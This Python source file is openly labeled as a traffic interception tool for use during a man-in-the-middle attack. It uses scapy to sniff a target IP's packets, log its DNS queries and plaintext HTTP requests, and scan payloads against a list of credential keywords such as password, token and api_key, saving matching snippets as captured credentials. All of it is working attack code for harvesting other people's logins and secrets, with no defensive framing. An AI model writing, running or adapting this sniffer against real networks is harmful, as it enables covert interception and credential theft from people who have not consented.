"""Traffic interception and logging during MITM.

Captures packets flowing through our machine during a MITM attack,
extracts useful information (DNS queries, HTTP requests, credentials).
"""

import threading
from dataclasses import dataclass, field
from datetime import datetime
from scapy.all import sniff, IP, TCP, UDP, DNS, DNSQR, Raw, conf


@dataclass
class CapturedPacket:
    """A captured packet with extracted metadata."""

    timestamp: str
    src_ip: str
    dst_ip: str
    protocol: str
    src_port: int = 0
    dst_port: int = 0
    info: str = ""
    raw_data: bytes = b""


@dataclass
class MITMSession:
    """Stores captured data for a MITM session."""

    target_ip: str
    start_time: str = ""
    packets: list[CapturedPacket] = field(default_factory=list)
    dns_queries: list[dict] = field(default_factory=list)
    http_requests: list[dict] = field(default_factory=list)
    credentials: list[dict] = field(default_factory=list)

    @property
    def packet_count(self) -> int:
        return len(self.packets)


class TrafficSniffer:
    """Sniffs and analyzes traffic during MITM attack."""

    # Common credential keywords in POST bodies
    CREDENTIAL_KEYWORDS = [
        b"password", b"passwd", b"pass", b"pwd",
        b"username", b"user", b"login", b"email",
        b"token", b"secret", b"api_key", b"apikey",
    ]

    def __init__(self, target_ip: str, interface: str | None = None):
        self.target_ip = target_ip
        self.interface = interface or conf.iface
        self.session = MITMSession(
            target_ip=target_ip,
            start_time=datetime.now().isoformat(),
        )
        self._running = False
        self._thread: threading.Thread | None = None

    def _packet_handler(self, pkt) -> None:
        """Process each captured packet."""
        if not pkt.haslayer(IP):
            return

        ip = pkt[IP]

        # Only capture traffic to/from our target
        if ip.src != self.target_ip and ip.dst != self.target_ip:
            return

        captured = CapturedPacket(
            timestamp=datetime.now().isoformat(),
            src_ip=ip.src,
            dst_ip=ip.dst,
            protocol="TCP" if pkt.haslayer(TCP) else "UDP" if pkt.haslayer(UDP) else "OTHER",
        )

        if pkt.haslayer(TCP):
            captured.src_port = pkt[TCP].sport
            captured.dst_port = pkt[TCP].dport

        if pkt.haslayer(UDP):
            captured.src_port = pkt[UDP].sport
            captured.dst_port = pkt[UDP].dport

        # Extract DNS queries
        if pkt.haslayer(DNS) and pkt.haslayer(DNSQR):
            qname = pkt[DNSQR].qname.decode(errors="ignore")
            captured.info = f"DNS: {qname}"
            self.session.dns_queries.append({
                "timestamp": captured.timestamp,
                "query": qname,
                "src": ip.src,
            })

        # Extract HTTP requests (plaintext)
        if pkt.haslayer(Raw) and pkt.haslayer(TCP):
            payload = bytes(pkt[Raw].load)

            # Detect HTTP requests
            if payload.startswith((b"GET ", b"POST ", b"PUT ", b"DELETE ", b"HEAD ")):
                try:
                    first_line = payload.split(b"\r\n")[0].decode(errors="ignore")
                    host = b""
                    for line in payload.split(b"\r\n"):
                        if line.lower().startswith(b"host:"):
                            host = line.split(b":", 1)[1].strip()
                            break
                    captured.info = f"HTTP: {first_line} (Host: {host.decode(errors='ignore')})"
                    self.session.http_requests.append({
                        "timestamp": captured.timestamp,
                        "request": first_line,
                        "host": host.decode(errors="ignore"),
                        "src": ip.src,
                    })
                except Exception:
                    pass

            # Detect potential credentials in POST data
            payload_lower = payload.lower()
            for keyword in self.CREDENTIAL_KEYWORDS:
                if keyword in payload_lower:
                    self.session.credentials.append({
                        "timestamp": captured.timestamp,
                        "src": ip.src,
                        "dst": ip.dst,
                        "port": captured.dst_port,
                        "snippet": payload[:500].decode(errors="ignore"),
                    })
                    captured.info += " [POSSIBLE CREDENTIALS]"
                    break

        self.session.packets.append(captured)

    def start(self) -> None:
        """Start sniffing traffic."""
        if self._running:
            return
        self._running = True
        self._thread = threading.Thread(target=self._sniff, daemon=True)
        self._thread.start()

    def _sniff(self) -> None:
        """Run the sniffer."""
        sniff(
            iface=self.interface,
            prn=self._packet_handler,
            store=False,
            stop_filter=lambda _: not self._running,
        )

    def stop(self) -> MITMSession:
        """Stop sniffing and return the session data."""
        self._running = False
        if self._thread:
            self._thread.join(timeout=5)
        return self.session
